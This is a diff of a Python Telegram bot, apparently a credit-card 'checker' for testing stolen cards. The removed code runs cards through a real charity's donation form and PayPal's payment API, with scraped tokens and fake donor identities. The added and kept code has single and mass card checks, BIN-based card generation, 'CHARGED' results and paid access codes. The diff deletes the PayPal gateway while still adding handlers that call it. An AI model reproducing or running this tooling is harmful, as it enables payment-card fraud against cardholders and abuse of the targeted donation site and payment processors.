@@ -10,7 +10,6 @@ import os
 import time
 import platform
 import sys
-import base64
 from datetime import datetime
 from io import BytesIO
 from typing import Dict, List, Optional, Tuple, Any
@@ -20,19 +19,6 @@ import string as string_module
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
-
-# محاولة استيراد user_agent
-try:
-    from user_agent import generate_user_agent
-except:
-    # إذا لم تكن موجودة، استخدم دالة بديلة
-    def generate_user_agent():
-        agents = [
-            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-        ]
-        return random.choice(agents)
 
 # ============================================================
 # CONFIGURATION
@@ -74,215 +60,6 @@ FONT_MAP = {
 
 def fb(text):
     return "".join(FONT_MAP.get(ch, ch) for ch in text)
-
-# ============================================================
-# PAYPAL JAZZ GATEWAY
-# ============================================================
-
-class PayPalJazzGateway:
-    def __init__(self):
-        self.session = requests.Session()
-        
-    def generate_data(self):
-        fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
-        lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
-        domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
-        f = random.choice(fnames)
-        l = random.choice(lnames)
-        num = random.randint(10, 999)
-        email = f"{f}.{l}{num}@{random.choice(domains)}"
-        name = f"{f.capitalize()} {l.capitalize()}"
-        add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
-        city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
-        zip_code = str(random.randint(10000, 99999))
-        return email, name, add, city, zip_code
-
-    def check_card(self, card_number, exp_month, exp_year, cvv):
-        """
-        فحص بطاقة عبر بوابة PayPal Jazz
-        returns: (success, message, details)
-        """
-        try:
-            email, name, add, city, zip_code = self.generate_data()
-            r = self.session
-            u = generate_user_agent()
-            
-            # الخطوة 1: جلب الصفحة واستخراج التوكينات
-            resp = r.get('https://jazzonthetube.com/video/support-jazz-on-the-tube/', headers={'User-Agent': u})
-            html = resp.text
-            
-            v1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', html).group(1)
-            v2 = re.search(r'name="give-form-id" value="([^"]+)"', html).group(1)
-            x1 = re.search(r'name="give-form-hash" value="([^"]+)"', html).group(1)
-            x23 = re.search(r'"data-client-token":"([^"]+)"', html).group(1)
-            
-            x24 = base64.b64decode(x23).decode()
-            x25 = json.loads(x24)
-            x26 = x25['paypal']['accessToken']
-            
-            # الخطوة 2: إرسال بيانات الدفع
-            headers = {
-                'Accept': '*/*',
-                'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Connection': 'keep-alive',
-                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'Origin': 'https://jazzonthetube.com',
-                'Referer': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'User-Agent': u,
-                'X-Requested-With': 'XMLHttpRequest',
-                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-            }
-
-            data = {
-                'give-honeypot': '',
-                'give-form-id-prefix': v1,
-                'give-form-id': v2,
-                'give-form-title': 'One Time Donation',
-                'give-current-url': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
-                'give-form-url': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
-                'give-form-minimum': '5.00',
-                'give-form-maximum': '999999.99',
-                'give-form-hash': x1,
-                'give-price-id': 'custom',
-                'give-recurring-logged-in-only': '',
-                'give-logged-in-only': '1',
-                'give_recurring_donation_details': '{"is_recurring":false}',
-                'give-amount': '5.00',
-                'give-radio-donation-level': 'custom',
-                'give_stripe_payment_method': '',
-                'payment-mode': 'paypal-commerce',
-                'give_first': name.split()[0] if ' ' in name else name,
-                'give_last': name.split()[1] if ' ' in name else name,
-                'give_company_option': 'no',
-                'give_company_name': '',
-                'give_email': email,
-                'card_name': name,
-                'card_exp_month': '',
-                'card_exp_year': '',
-                'billing_country': 'US',
-                'card_address': add,
-                'card_address_2': '',
-                'card_city': city,
-                'card_state': 'NY',
-                'card_zip': zip_code,
-                'give_action': 'purchase',
-                'give-gateway': 'paypal-commerce',
-                'action': 'give_process_donation',
-                'give_ajax': 'true',
-            }
-
-            response = r.post('https://jazzonthetube.com/video/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
-
-            # الخطوة 3: إنشاء الطلب
-            params = {'action': 'give_paypal_commerce_create_order'}
-            files = {
-                'give-honeypot': (None, ''),
-                'give-form-id-prefix': (None, v1),
-                'give-form-id': (None, v2),
-                'give-form-title': (None, 'One Time Donation'),
-                'give-current-url': (None, 'https://jazzonthetube.com/video/support-jazz-on-the-tube/'),
-                'give-form-url': (None, 'https://jazzonthetube.com/video/support-jazz-on-the-tube/'),
-                'give-form-minimum': (None, '5.00'),
-                'give-form-maximum': (None, '999999.99'),
-                'give-form-hash': (None, x1),
-                'give-price-id': (None, 'custom'),
-                'give-recurring-logged-in-only': (None, ''),
-                'give-logged-in-only': (None, '1'),
-                'give_recurring_donation_details': (None, '{"is_recurring":false}'),
-                'give-amount': (None, '5.00'),
-                'give-radio-donation-level': (None, 'custom'),
-                'give_stripe_payment_method': (None, ''),
-                'payment-mode': (None, 'paypal-commerce'),
-                'give_first': (None, name.split()[0] if ' ' in name else name),
-                'give_last': (None, name.split()[1] if ' ' in name else name),
-                'give_company_option': (None, 'no'),
-                'give_company_name': (None, ''),
-                'give_email': (None, email),
-                'card_name': (None, name),
-                'card_exp_month': (None, ''),
-                'card_exp_year': (None, ''),
-                'billing_country': (None, 'US'),
-                'card_address': (None, add),
-                'card_address_2': (None, ''),
-                'card_city': (None, city),
-                'card_state': (None, 'NY'),
-                'card_zip': (None, zip_code),
-                'give-gateway': (None, 'paypal-commerce'),
-            }
-
-            response = r.post(
-                'https://jazzonthetube.com/video/wp-admin/admin-ajax.php',
-                params=params,
-                cookies=r.cookies,
-                headers=headers,
-                files=files,
-            )
-            
-            try:
-                xdata = response.json()['data']['id']
-            except:
-                return False, "Failed to create order", {}
-
-            # الخطوة 4: تأكيد الدفع مع البطاقة
-            headers = {
-                'authority': 'cors.api.paypal.com',
-                'accept': '*/*',
-                'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
-                'authorization': f'Bearer {x26}',
-                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
-                'content-type': 'application/json',
-                'origin': 'https://assets.braintreegateway.com',
-                'referer': 'https://assets.braintreegateway.com/',
-                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'cross-site',
-                'user-agent': u,
-            }
-
-            json_data = {
-                'payment_source': {
-                    'card': {
-                        'number': card_number,
-                        'expiry': f"{exp_year}-{exp_month}",
-                        'security_code': cvv,
-                        'attributes': {
-                            'verification': {
-                                'method': 'SCA_WHEN_REQUIRED',
-                            },
-                        },
-                    },
-                },
-                'application_context': {
-                    'vault': False,
-                },
-            }
-
-            response = r.post(
-                f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
-                headers=headers,
-                json=json_data,
-            )
-
-            result = response.json()
-            
-            if response.status_code == 200 and result.get('status') in ['COMPLETED', 'APPROVED']:
-                return True, "Payment Approved", result
-            elif 'error' in result:
-                error_msg = result.get('error', {}).get('message', 'Payment Declined')
-                return False, error_msg, result
-            else:
-                return False, "Payment Declined", result
-
-        except Exception as e:
-            return False, f"Error: {str(e)}", {}
 
 # ============================================================
 # BIN DATABASE
@@ -401,13 +178,16 @@ def get_user(user_id):
         }
     return user_db[user_id]
 
+# تصحيح دوال الإيقاف
 def stop_all_checks():
     global stop_check
     stop_check = True
+    print(f"[DEBUG] Stop signal set to: {stop_check}")
 
 def reset_stop():
     global stop_check
     stop_check = False
+    print(f"[DEBUG] Stop signal reset to: {stop_check}")
 
 def is_stopped():
     return stop_check
@@ -432,11 +212,6 @@ gateways = {
     "stripe": {
         "name": "Stripe", "url": DEFAULT_BUY_URL,
         "link_id": DEFAULT_PAYMENT_LINK_ID, "active": True,
-    },
-    "paypal_jazz": {
-        "name": "PayPal Jazz",
-        "url": "https://jazzonthetube.com",
-        "active": True,
     }
 }
 
@@ -449,7 +224,7 @@ def add_gateway(name, url):
 
 def remove_gateway(name):
     name = name.lower()
-    if name in gateways and name not in ["stripe", "paypal_jazz"]:
+    if name in gateways and name != "stripe":
         del gateways[name]
         return True
     return False
@@ -525,45 +300,7 @@ def b_blue(text, callback):
     return {"text": text, "callback": callback, "style": "primary"}
 
 # ============================================================
-# UI BUILDERS
-# ============================================================
-
-def build_main_menu(user_id):
-    menu = [
-        [b_blue(fb("Tools"), "tools")],
-        [b_blue(fb("Profile"), "profile")],
-        [b_blue(fb("Settings"), "settings")],
-        [b_blue(fb("About"), "about")],
-    ]
-    
-    if str(user_id) == str(ADMIN_ID):
-        menu.append([b_red("<code>Admin Panel</code>", "admin_panel")])
-    
-    return menu
-
-def build_tools_menu():
-    return [
-        [b_green(fb("Single Check"), "tool_chk")],
-        [b_green(fb("Mass Check"), "tool_mass")],
-        [b_green(fb("BIN Lookup"), "tool_bin")],
-        [b_green(fb("Generator"), "tool_gen")],
-        [b_green(fb("PayPal Jazz"), "tool_pp")],
-        [b_green(fb("PayPal Mass"), "tool_px")],
-        [b_blue(fb("Back"), "menu")],
-    ]
-
-def build_settings_menu():
-    return [
-        [b_blue(fb("Shopify"), "gw_shopify")],
-        [b_blue(fb("3DS Lookup"), "gw_3ds")],
-        [b_blue(fb("Site Management"), "gw_site")],
-        [b_blue(fb("Proxy Management"), "gw_proxy")],
-        [b_blue(fb("Other"), "gw_other")],
-        [b_blue(fb("Back"), "menu")],
-    ]
-
-# ============================================================
-# CARD ENGINE (Stripe)
+# CARD ENGINE
 # ============================================================
 
 class CardEngine:
@@ -590,9 +327,6 @@ class CardEngine:
                 "exp_year": year, "name": name or "Card Holder", "email": self.gen_email()}
 
     def check(self, card, gateway="stripe"):
-        if gateway == "paypal_jazz":
-            return self.check_paypal_jazz(card)
-        
         card_str = f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}"
         gw = gateways.get(gateway, gateways["stripe"])
         buy_url, pl_id = gw["url"], gw["link_id"]
@@ -752,18 +486,6 @@ class CardEngine:
             return card_str, True, "CHARGED", True
         return card_str, False, "Unknown response", False
 
-    def check_paypal_jazz(self, card):
-        """فحص عبر PayPal Jazz Gateway"""
-        gateway = PayPalJazzGateway()
-        success, message, details = gateway.check_card(
-            card['number'],
-            card['exp_month'],
-            card['exp_year'],
-            card['cvc']
-        )
-        card_str = f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}"
-        return card_str, success, message, success
-
 engine = CardEngine()
 
 # ============================================================
@@ -794,6 +516,53 @@ def gen_card_from_bin(bin_prefix, count=10):
     return results
 
 # ============================================================
+# UI BUILDERS
+# ============================================================
+
+def build_main_menu():
+    return [
+        [b_blue(fb("Tools"), "tools")],
+        [b_blue(fb("Profile"), "profile")],
+        [b_blue(fb("Settings"), "settings")],
+        [b_blue(fb("About"), "about")],
+        [b_red(fb("Admin Panel"), "admin_panel")],
+    ]
+
+def build_admin_menu():
+    return [
+        [b_green(fb("Generate Code"), "admin_gen")],
+        [b_red(fb("Ban User"), "admin_ban")],
+        [b_blue(fb("List Users"), "admin_list")],
+        [b_blue(fb("Bot Speed"), "admin_speed")],
+        [b_blue(fb("Bot Stats"), "admin_stats")],
+        [b_red(fb("Broadcast"), "admin_broadcast")],
+        [b_blue(fb("Backup"), "admin_backup")],
+        [b_blue(fb("Restart"), "admin_restart")],
+        [b_blue(fb("Back"), "menu")],
+    ]
+
+def build_tools_menu():
+    return [
+        [b_green(fb("Single Check"), "tool_chk")],
+        [b_green(fb("Mass Check"), "tool_mass")],
+        [b_green(fb("BIN Lookup"), "tool_bin")],
+        [b_green(fb("Generator"), "tool_gen")],
+        [b_green(fb("PayPal Jazz"), "tool_pp")],
+        [b_green(fb("PayPal Mass"), "tool_px")],
+        [b_blue(fb("Back"), "menu")],
+    ]
+
+def build_settings_menu():
+    return [
+        [b_blue(fb("Shopify"), "gw_shopify")],
+        [b_blue(fb("3DS Lookup"), "gw_3ds")],
+        [b_blue(fb("Site Management"), "gw_site")],
+        [b_blue(fb("Proxy Management"), "gw_proxy")],
+        [b_blue(fb("Other"), "gw_other")],
+        [b_blue(fb("Back"), "menu")],
+    ]
+
+# ============================================================
 # COMMANDS
 # ============================================================
 
@@ -819,8 +588,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ━━━━━━━━━━━━━━
 {fb('Use the buttons below to navigate.')}"""
 
-    menu = build_main_menu(user_id)
-    send_colored_buttons(update.effective_chat.id, text, menu)
+    send_colored_buttons(update.effective_chat.id, text, build_main_menu())
 
 
 async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -889,82 +657,6 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     except Exception as e:
         await status_msg.edit_text(f"{fb('Error')}: <code>{str(e)}</code>", parse_mode="HTML")
-
-
-async def cmd_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """فحص بطاقة عبر PayPal Jazz - /pp cc|mm|yyyy|cvv"""
-    user_id = update.effective_user.id
-    
-    if user_id in banned_users:
-        await update.message.reply_text(fb("You are banned!"))
-        return
-    
-    udata = get_user(user_id)
-    if not context.args:
-        await update.message.reply_text(f"{fb('Usage')}: <code>/pp cc|mm|yyyy|cvv</code>", parse_mode="HTML")
-        return
-    
-    line = " ".join(context.args)
-    card = engine.parse(line)
-    if not card:
-        await update.message.reply_text(f"{fb('Invalid format!')}\n{fb('Use')}: <code>cc|mm|yyyy|cvv</code>", parse_mode="HTML")
-        return
-
-    status_msg = await update.message.reply_text(f"{fb('Checking via PayPal Jazz...')}\n<code>{line}</code>", parse_mode="HTML")
-    
-    try:
-        card_str, success, msg, charged = engine.check(card, gateway="paypal_jazz")
-        udata["checks"] += 1
-
-        bin_info = bin_lookup_with_cache(card['number'])
-        bin_scheme = bin_info.get('scheme', 'Unknown')
-        bin_type = bin_info.get('type', 'Unknown')
-        bin_brand = bin_info.get('brand', 'Unknown')
-        bin_country = bin_info.get('country', 'Unknown')
-        bin_bank = bin_info.get('bank', 'Unknown')
-        bin_emoji = bin_info.get('emoji', '')
-
-        if success:
-            udata["charged"] += 1
-            status_text = "CHARGED!"
-            status_icon = "[+]"
-            response_text = "APPROVED"
-        else:
-            udata["declined"] += 1
-            status_text = "DECLINED"
-            status_icon = "[-]"
-            response_text = msg
-
-        output = f"""{status_icon} Gateway: PayPal Jazz
--------------------------------
-{status_icon} Card: <code>{card_str}</code>
-{status_icon} Status: {status_text}
-{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
--------------------------------
-{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
-{status_icon} Bank: {bin_bank}
-{status_icon} Country: {bin_country} {bin_emoji}
--------------------------------
-{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
-{status_icon} By: yacinedev Checker
--------------------------------"""
-
-        await status_msg.edit_text(output, parse_mode="HTML")
-
-    except Exception as e:
-        await status_msg.edit_text(f"{fb('Error')}: <code>{str(e)}</code>", parse_mode="HTML")
-
-
-async def cmd_px(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """فحص ملف عبر PayPal Jazz - /px (رفع ملف)"""
-    await update.message.reply_text(
-        f"{fb('PayPal Jazz Mass Check')}\n\n"
-        f"{fb('Send a .txt file with cards.')}\n"
-        f"{fb('Format')}: <code>cc|mm|yyyy|cvv</code>\n"
-        f"{fb('One card per line.')}",
-        parse_mode="HTML"
-    )
-    context.user_data["state"] = "px"
 
 
 async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1068,6 +760,96 @@ async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cmd_stopcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stop_all_checks()
     await update.message.reply_text(fb("Stop signal sent. Checks will halt."))
+
+
+async def cmd_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """فحص بطاقة عبر PayPal Jazz - /pp cc|mm|yyyy|cvv"""
+    user_id = update.effective_user.id
+    
+    if user_id in banned_users:
+        await update.message.reply_text(fb("You are banned!"))
+        return
+    
+    udata = get_user(user_id)
+    if not context.args:
+        await update.message.reply_text(f"{fb('Usage')}: <code>/pp cc|mm|yyyy|cvv</code>", parse_mode="HTML")
+        return
+    
+    line = " ".join(context.args)
+    card = engine.parse(line)
+    if not card:
+        await update.message.reply_text(f"{fb('Invalid format!')}\n{fb('Use')}: <code>cc|mm|yyyy|cvv</code>", parse_mode="HTML")
+        return
+
+    status_msg = await update.message.reply_text(f"{fb('Checking via PayPal Jazz...')}\n<code>{line}</code>", parse_mode="HTML")
+    
+    try:
+        card_str, success, msg, charged = engine.check(card, gateway="paypal_jazz")
+        udata["checks"] += 1
+
+        bin_info = bin_lookup_with_cache(card['number'])
+        bin_scheme = bin_info.get('scheme', 'Unknown')
+        bin_type = bin_info.get('type', 'Unknown')
+        bin_brand = bin_info.get('brand', 'Unknown')
+        bin_country = bin_info.get('country', 'Unknown')
+        bin_bank = bin_info.get('bank', 'Unknown')
+        bin_emoji = bin_info.get('emoji', '')
+
+        if success:
+            udata["charged"] += 1
+            status_text = "CHARGED!"
+            status_icon = "[+]"
+            response_text = "APPROVED"
+        else:
+            udata["declined"] += 1
+            status_text = "DECLINED"
+            status_icon = "[-]"
+            response_text = msg
+
+        output = f"""{status_icon} Gateway: PayPal Jazz
+-------------------------------
+{status_icon} Card: <code>{card_str}</code>
+{status_icon} Status: {status_text}
+{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
+-------------------------------
+{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
+{status_icon} Bank: {bin_bank}
+{status_icon} Country: {bin_country} {bin_emoji}
+-------------------------------
+{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
+{status_icon} By: yacinedev Checker
+-------------------------------"""
+
+        await status_msg.edit_text(output, parse_mode="HTML")
+
+    except Exception as e:
+        await status_msg.edit_text(f"{fb('Error')}: <code>{str(e)}</code>", parse_mode="HTML")
+
+
+async def cmd_px(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """فحص ملف عبر PayPal Jazz - /px (رفع ملف)"""
+    await update.message.reply_text(
+        f"{fb('PayPal Jazz Mass Check')}\n\n"
+        f"{fb('Send a .txt file with cards.')}\n"
+        f"{fb('Format')}: <code>cc|mm|yyyy|cvv</code>\n"
+        f"{fb('One card per line.')}",
+        parse_mode="HTML"
+    )
+    context.user_data["state"] = "px"
+
+
+async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if str(user_id) != str(ADMIN_ID):
+        await update.message.reply_text(fb("Admin only!"))
+        return
+    
+    global user_db, banned_users, generated_codes
+    user_db = {}
+    banned_users = set()
+    generated_codes = {}
+    
+    await update.message.reply_text(fb("All data cleared successfully!"))
 
 # ============================================================
 # ADMIN COMMANDS
@@ -1376,6 +1158,115 @@ async def cmd_sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cmd_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await cmd_site(update, context)
 
+
+# ============================================================
+# MASS CHECK FUNCTIONS (مع زر Stop شغال)
+# ============================================================
+
+async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list, user_id: int, udata: dict):
+    valid_cards = [engine.parse(line) for line in lines if engine.parse(line)]
+    
+    if not valid_cards:
+        await update.message.reply_text(fb("No valid cards found!"))
+        return
+    
+    # إعادة تعيين إشارة الإيقاف قبل البدء
+    reset_stop()
+    
+    status_msg = await update.message.reply_text(
+        f"{fb('Checking')} {len(valid_cards)} {fb('cards...')}",
+        parse_mode="HTML"
+    )
+    
+    charged_count = 0
+    declined_count = 0
+    _3ds_count = 0
+    
+    for idx, card in enumerate(valid_cards, 1):
+        # التحقق من الإيقاف قبل كل بطاقة
+        if is_stopped():
+            await update.message.reply_text(fb("Mass check stopped by user."))
+            break
+        
+        try:
+            card_str, success, msg, charged = engine.check(card)
+            udata["checks"] += 1
+            
+            # الحصول على معلومات BIN
+            bin_info = bin_lookup_with_cache(card['number'])
+            bin_scheme = bin_info.get('scheme', 'Unknown')
+            bin_type = bin_info.get('type', 'Unknown')
+            bin_brand = bin_info.get('brand', 'Unknown')
+            bin_country = bin_info.get('country', 'Unknown')
+            bin_bank = bin_info.get('bank', 'Unknown')
+            bin_emoji = bin_info.get('emoji', '')
+            
+            # تحديث الإحصائيات
+            if success:
+                charged_count += 1
+                udata["charged"] += 1
+                status_icon = "[+]"
+                status_text = "CHARGED!"
+                response_text = "APPROVED"
+            elif "3DS" in msg:
+                _3ds_count += 1
+                udata["_3ds"] += 1
+                status_icon = "[~]"
+                status_text = "3DS Required"
+                response_text = "3DS OTP"
+            else:
+                declined_count += 1
+                udata["declined"] += 1
+                status_icon = "[-]"
+                status_text = "DECLINED"
+                response_text = msg
+            
+            # بناء الرد بالشكل المطلوب مع أزرار
+            result_output = f"""
+{status_icon} Card: {card_str}
+Status: {status_text}
+Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
+───────────────────
+[Approved] [Declined] [Charge] [Error]
+"""
+            
+            # إضافة الأزرار
+            buttons = InlineKeyboardMarkup([
+                [
+                    InlineKeyboardButton("Approved", callback_data=f"approve_{card_str}"),
+                    InlineKeyboardButton("Declined", callback_data=f"decline_{card_str}"),
+                    InlineKeyboardButton("Charge", callback_data=f"charge_{card_str}"),
+                    InlineKeyboardButton("Error", callback_data=f"error_{card_str}")
+                ]
+            ])
+            
+            await update.message.reply_text(result_output, reply_markup=buttons, parse_mode="HTML")
+            
+            # تحديث التقدم
+            if idx % 5 == 0 or idx == len(valid_cards):
+                try:
+                    await status_msg.edit_text(
+                        f"{fb('Checking...')} {idx}/{len(valid_cards)}\n"
+                        f"{fb('Approved')}: {charged_count} | {fb('Declined')}: {declined_count} | {fb('3DS')}: {_3ds_count}",
+                        parse_mode="HTML"
+                    )
+                except:
+                    pass
+                await asyncio.sleep(0.3)
+        except Exception as e:
+            pass
+    
+    summary = f"""
+{fb('Mass Check Complete')}
+━━━━━━━━━━━━━━
+{fb('Total')}: {len(valid_cards)}
+{fb('Approved')}: {charged_count}
+{fb('Declined')}: {declined_count}
+{fb('3DS')}: {_3ds_count}
+"""
+    await update.message.reply_text(summary, parse_mode="HTML")
+
+
 # ============================================================
 # MESSAGE AND DOCUMENT HANDLERS
 # ============================================================
@@ -1422,164 +1313,68 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(fb("Please send .txt files only!"))
         return
     
+    # إرسال رسالة مع زر الإيقاف
+    await update.message.reply_text(
+        f"{fb('File received. Starting mass check...')}\n"
+        f"{fb('Press /stopcheck to halt the process.')}",
+        parse_mode="HTML"
+    )
+    
     file = await context.bot.get_file(document.file_id)
     file_bytes = await file.download_as_bytearray()
     content = file_bytes.decode("utf-8", errors="ignore")
     lines = [line.strip() for line in content.split("\n") if line.strip()]
     
-    state = context.user_data.get("state", "")
-    
-    if state == "px":
-        await process_paypal_mass(update, context, lines, user_id, udata)
-    else:
-        await process_mass(update, context, lines, user_id, udata)
-    
+    await process_mass(update, context, lines, user_id, udata)
     context.user_data["state"] = ""
 
 
-async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list, user_id: int, udata: dict):
-    valid_cards = [engine.parse(line) for line in lines if engine.parse(line)]
+# ============================================================
+# CALLBACK HANDLER
+# ============================================================
+
+async def card_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """معالج أزرار البطاقات (Approved, Declined, Charge, Error)"""
+    query = update.callback_query
+    await query.answer()
+    data = query.data
     
-    if not valid_cards:
-        await update.message.reply_text(fb("No valid cards found!"))
+    try:
+        action, card_number = data.split("_", 1)
+    except ValueError:
+        await query.message.reply_text("Invalid action format.")
         return
     
-    reset_stop()
+    actions_map = {
+        "approve": "Approved",
+        "decline": "Declined",
+        "charge": "Charged",
+        "error": "Error"
+    }
     
-    status_msg = await update.message.reply_text(
-        f"{fb('Checking')} {len(valid_cards)} {fb('cards...')}",
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(fb("⏹ STOP CHECK"), callback_data="mass_stop")]
-        ])
-    )
+    action_name = actions_map.get(action, "Unknown")
     
-    charged_count = declined_count = _3ds_count = 0
+    # تسجيل الإجراء في سجل المستخدم
+    user_id = update.effective_user.id
+    udata = get_user(user_id)
     
-    for idx, card in enumerate(valid_cards, 1):
-        if is_stopped():
-            await update.message.reply_text(fb("⏹ Mass check stopped by user."))
-            break
-        
-        try:
-            card_str, success, msg, charged = engine.check(card)
-            udata["checks"] += 1
-            
-            bin_info = bin_lookup_with_cache(card['number'])
-            bin_scheme = bin_info.get('scheme', 'Unknown')
-            bin_type = bin_info.get('type', 'Unknown')
-            bin_brand = bin_info.get('brand', 'Unknown')
-            bin_country = bin_info.get('country', 'Unknown')
-            bin_bank = bin_info.get('bank', 'Unknown')
-            bin_emoji = bin_info.get('emoji', '')
-            
-            if success:
-                charged_count += 1
-                udata["charged"] += 1
-                status_icon = "[+]"
-                status_text = "CHARGED!"
-            elif "3DS" in msg:
-                _3ds_count += 1
-                udata["_3ds"] += 1
-                status_icon = "[~]"
-                status_text = "3DS Required"
-            else:
-                declined_count += 1
-                udata["declined"] += 1
-                status_icon = "[-]"
-                status_text = "DECLINED"
-            
-            result_output = f"""{status_icon} Card: {card_str} | {status_text} | {bin_scheme} | {bin_country}"""
-            await update.message.reply_text(result_output, parse_mode="HTML")
-            
-            if idx % 5 == 0 or idx == len(valid_cards):
-                try:
-                    await status_msg.edit_text(
-                        f"{fb('Checking...')} {idx}/{len(valid_cards)}\n"
-                        f"{fb('Approved')}: {charged_count} | {fb('Declined')}: {declined_count} | {fb('3DS')}: {_3ds_count}",
-                        parse_mode="HTML",
-                        reply_markup=InlineKeyboardMarkup([
-                            [InlineKeyboardButton(fb("⏹ STOP CHECK"), callback_data="mass_stop")]
-                        ])
-                    )
-                except:
-                    pass
-                await asyncio.sleep(0.3)
-        except Exception as e:
-            pass
+    # إضافة الإجراء إلى التاريخ
+    if "actions" not in udata:
+        udata["actions"] = []
+    udata["actions"].append({
+        "action": action_name,
+        "card": card_number,
+        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    })
     
-    summary = f"""
-{fb('Mass Check Complete')}
-━━━━━━━━━━━━━━
-{fb('Total')}: {len(valid_cards)}
-{fb('Approved')}: {charged_count}
-{fb('Declined')}: {declined_count}
-{fb('3DS')}: {_3ds_count}
-"""
-    await update.message.reply_text(summary, parse_mode="HTML")
-
-
-async def process_paypal_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, lines: list, user_id: int, udata: dict):
-    """معالجة فحص PayPal Jazz الجماعي"""
-    valid_cards = [engine.parse(line) for line in lines if engine.parse(line)]
-    
-    if not valid_cards:
-        await update.message.reply_text(fb("No valid cards found!"))
-        return
-    
-    status_msg = await update.message.reply_text(
-        f"{fb('Checking via PayPal Jazz...')} {len(valid_cards)} {fb('cards')}",
+    await query.message.reply_text(
+        f"[{action_name}] Card: {card_number}\nAction recorded successfully.",
         parse_mode="HTML"
     )
-    
-    charged_count = declined_count = 0
-    
-    for idx, card in enumerate(valid_cards, 1):
-        try:
-            card_str, success, msg, charged = engine.check(card, gateway="paypal_jazz")
-            udata["checks"] += 1
-            
-            if success:
-                charged_count += 1
-                udata["charged"] += 1
-                status_icon = "[+]"
-                status_text = "CHARGED!"
-            else:
-                declined_count += 1
-                udata["declined"] += 1
-                status_icon = "[-]"
-                status_text = "DECLINED"
-            
-            result_output = f"""{status_icon} PayPal Jazz | {card_str} | {status_text} | {msg}"""
-            await update.message.reply_text(result_output, parse_mode="HTML")
-            
-            if idx % 5 == 0:
-                try:
-                    await status_msg.edit_text(
-                        f"{fb('Checking...')} {idx}/{len(valid_cards)}\n"
-                        f"{fb('Approved')}: {charged_count} | {fb('Declined')}: {declined_count}",
-                        parse_mode="HTML"
-                    )
-                except:
-                    pass
-                await asyncio.sleep(0.3)
-        except Exception as e:
-            pass
-    
-    summary = f"""
-{fb('PayPal Jazz Mass Check Complete')}
-━━━━━━━━━━━━━━
-{fb('Total')}: {len(valid_cards)}
-{fb('Approved')}: {charged_count}
-{fb('Declined')}: {declined_count}
-"""
-    await update.message.reply_text(summary, parse_mode="HTML")
 
-# ============================================================
-# BUTTON HANDLER
-# ============================================================
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """المعالج الرئيسي للأزرار"""
     query = update.callback_query
     await query.answer()
